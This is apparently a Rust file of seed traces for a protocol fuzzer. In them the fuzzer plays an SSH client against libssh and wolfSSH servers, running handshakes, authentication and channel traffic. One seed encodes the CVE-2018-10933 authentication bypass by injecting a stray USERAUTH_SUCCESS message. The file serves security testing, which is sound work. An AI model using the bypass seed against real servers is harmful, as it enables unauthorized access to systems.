use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::Term;
use puffin::term;
use puffin::trace::{InputAction, OutputAction, Trace};

use crate::protocol::{
    AgentType, RawSshMessageFlight, SshDescriptorConfig, SshProtocolBehavior, SshProtocolTypes,
};
use crate::ssh::fn_impl::*;
use crate::ssh::message::{
    CompressionAlgorithms, EncryptionAlgorithms, KexAlgorithms, MacAlgorithms, OnWireData,
    RawSshMessage, SignatureSchemes, SshBytes, SshMessage,
};

// ── Seed: client attacker with full handshake and encrypted post-NewKeys ──────
//
// The fuzzer acts as the SSH client; the server is a real libssh instance.
// We compute the exchange hash using the actual server ephemeral ECDH key and
// derive the encryption key so we can send properly encrypted post-NewKeys
// messages (ServiceRequest, UserAuthRequest, ChannelOpen, ChannelRequest).

pub fn seed_client_attacker_full(server: AgentName) -> Trace<SshProtocolTypes> {
    // Knowledge available after OutputAction + sending banner/kexinit/EcdhInit:
    //   (server, 0)[None]/RawSshMessage → server banner
    //   (server, 0)[None]/SshMessage    → server KexInit
    //   (server, 1)[None]/SshMessage    → server KexEcdhReply

    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };

    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    // Use RawSshMessage for K_S extraction (SshMessage lossy-parses RSA keys).
    // RawSshMessage indices: 0=Banner, 1=KexInit, 2=KexEcdhReply, 3=NewKeys
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };

    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };

    // Our kexinit mirrors server's algorithms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };

    let enc_key = term! {
        fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers: banner is NOT a binary packet.
    // Binary packets we send: KexInit(0), KexEcdhInit(1), NewKeys(2)
    // First encrypted packets: ServiceRequest(3), AuthRequest(4),
    //   ChannelOpen(5), ChannelRequest(6)
    let svc_req = term! {
        fn_encrypt_packet(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key),
            (fn_u32_3)
        )
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_password),
                (fn_password_auth_data((fn_password)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open(
                (fn_channel_session),
                (fn_u32_0),
                (fn_u32_1),
                (fn_u32_2),
                (fn_empty_bytes_vec)
            )),
            (@enc_key),
            (fn_u32_5)
        )
    };
    let chan_req = term! {
        fn_encrypt_packet(
            (fn_channel_request(
                (fn_u32_0),
                (fn_channel_exec),
                (fn_true),
                (fn_exec_payload((fn_ssh_userauth)))
            )),
            (@enc_key),
            (fn_u32_6)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker authenticating with PUBLIC KEY (identity A) ─────────
//
// Same handshake as seed_client_attacker_full, but instead of password auth the
// fuzzer logs in with publickey method, signing the RFC 4252 §7 blob with client
// identity key A (the only client key whose private half is in the signature).
// This is the honest baseline for the entity-authentication / impersonation
// oracle: it completes as A; any mutation that makes the server authenticate a
// *different* key is flagged as impersonation.
pub fn seed_client_attacker_pubkey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet((fn_service_request((fn_ssh_userauth))), (@enc_key), (fn_u32_3))
    };

    // Publickey auth: sign the §7 blob (over the session id = exchange hash) with
    // key A, then carry A's blob + the signature in the request.
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker full handshake over AES-256-GCM ─────────────────────
//
// Same shape as seed_client_attacker_full but forces aes256-gcm@openssh.com
// (offered by BOTH libssh and wolfSSH), so this single seed completes the full
// handshake + encrypted record layer against both implementations. The fuzzer
// is the client; the libssh/wolfSSH server is the PUT.
pub fn seed_client_attacker_full_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Fixed client KexInit offering only aes256-gcm.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // c2s AES-256-GCM key + IV.
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // AES-GCM invocation counter = per-direction packet index since NewKeys (0,1,2,3).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Same AES-GCM client-attacker handshake as `seed_client_attacker_full_aesgcm`,
/// but the client KEXINIT is *synthesized* from algorithm-name atoms via
/// `fn_kex_init` + the new `fn_namelist_*` / `fn_*_algos` builders, instead of the
/// fixed `fn_client_kexinit_aesgcm`. Functionally identical (offers
/// curve25519-sha256 / aes256-gcm / hmac-sha2-256 / rsa-sha2 / none, so it still
/// negotiates AES-256-GCM and completes), but every offered algorithm list is now
/// a mutable sub-term: the DY mutator can drop/reorder/duplicate/replace entries
/// (downgrade, unknown-algorithm injection, algorithm confusion) from this seed.
pub fn seed_client_attacker_full_kexinit_synth(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Client KexInit built bottom-up from algorithm-name atoms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Client-attacker handshake on the **non-AEAD** suite aes256-ctr +
/// hmac-sha2-256 (both libssh and wolfSSH support it). This drives the separate
/// stream-cipher + separate-HMAC code path — distinct from the AEAD ciphers the
/// other seeds use — and then sends one correctly AES-CTR-encrypted /
/// HMAC-authenticated service-request packet, exercising the server's CTR
/// decrypt + HMAC-verify code. The KEXINIT is synthesized via `fn_kex_init`, so
/// the offered algorithms are mutable sub-terms.
pub fn seed_client_attacker_full_ctr(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
            (fn_sig_schemes((fn_namelist_2((fn_algo_rsa_sha2_512), (fn_algo_rsa_sha2_256))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_ctr))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // aes256-ctr enc key ('C'), 16-byte CTR IV ('A'), hmac-sha2-256 key ('E').
    let enc_key = term! { fn_derive_ctr_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_ctr_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let mac_key = term! { fn_derive_mac_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // AES-CTR keeps a continuous 128-bit counter across packets, so each packet's
    // block_offset is the cumulative number of 16-byte blocks already sent on this
    // direction. ServiceRequest("ssh-userauth") encrypts to 32 bytes = 2 blocks,
    // so the UserAuthRequest that follows starts at block offset 2.
    //   svc_req:  block_offset 0, seqno 3
    //   auth_req: block_offset 2, seqno 4  (libssh emits its claim only after auth)
    let svc_req = term! {
        fn_encrypt_packet_ctr(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_0), (fn_u32_3))
    };
    let auth_req = term! {
        fn_encrypt_packet_ctr(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@enc_key), (@iv), (@mac_key), (fn_u32_2), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: CVE-2018-10933 authentication bypass (client attacker) ──────────────
//
// The fuzzer (client) completes the KEX, then — instead of authenticating —
// injects an SSH_MSG_USERAUTH_SUCCESS (a message a server should never accept)
// followed by a channel open. A libssh server vulnerable to CVE-2018-10933
// wrongly transitions to the authenticated state on the stray USERAUTH_SUCCESS
// and then accepts the channel open; the harness records a completed handshake
// with NO authentication method, which the entity-authentication oracle flags.
// A patched server ignores/rejects the stray message and never completes.
pub fn seed_client_attacker_auth_bypass(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // The bypass: inject USERAUTH_SUCCESS (seqno 3), then a channel open (4).
    let bypass = term! {
        fn_encrypt_packet((fn_user_auth_success), (@enc_key), (fn_u32_3))
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@enc_key), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @bypass }),
            InputAction::new_step(server, term! { @chan_open }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker, PUBLIC KEY auth over AES-256-GCM (both vendors) ────
//
// Like seed_client_attacker_pubkey but over the AES-GCM record layer, so it
// completes on wolfSSH (which lacks chacha20-poly1305) as well as libssh. This
// is the cross-vendor baseline for the entity-authentication / impersonation
// oracle.
pub fn seed_client_attacker_pubkey_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    // Channel traffic after auth — also pumps extra progress() iterations, which
    // wolfSSH's single-step accept() needs to finish processing the auth.
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((fn_u32_0), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_ssh_userauth))))),
            (@key), (@iv), (fn_u32_3))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

/// Session-layer (RFC 4254 connection protocol) seed: authenticate by publickey
/// (key A, accepted), open a session channel, then drive the full set of channel
/// messages — WINDOW_ADJUST, DATA, EXTENDED_DATA, EOF, CLOSE. The other seeds stop
/// at channel-open / channel-request; this one exercises libssh's channel data /
/// flow-control / teardown handlers, a large code area no other seed reaches.
/// AES-256-GCM, c2s counter = packet index since NewKeys.
pub fn seed_client_attacker_channel_data(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_2))
    };
    // Connection-protocol traffic on the (assumed channel 0) session.
    let win_adjust = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_window_adjust((fn_u32_0), (fn_u32_0x10000))), (@key), (@iv), (fn_u32_3))
    };
    let chan_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_data((fn_u32_0), (fn_placeholder_32bytes))), (@key), (@iv), (fn_u32_4))
    };
    let chan_ext_data = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_extended_data((fn_u32_0), (fn_u32_1), (fn_placeholder_32bytes))),
            (@key), (@iv), (fn_u32_5))
    };
    let chan_eof = term! {
        fn_encrypt_packet_aesgcm((fn_channel_eof((fn_u32_0))), (@key), (@iv), (fn_u32_6))
    };
    let chan_close = term! {
        fn_encrypt_packet_aesgcm((fn_channel_close((fn_u32_0))), (@key), (@iv), (fn_u32_7))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @win_adjust }),
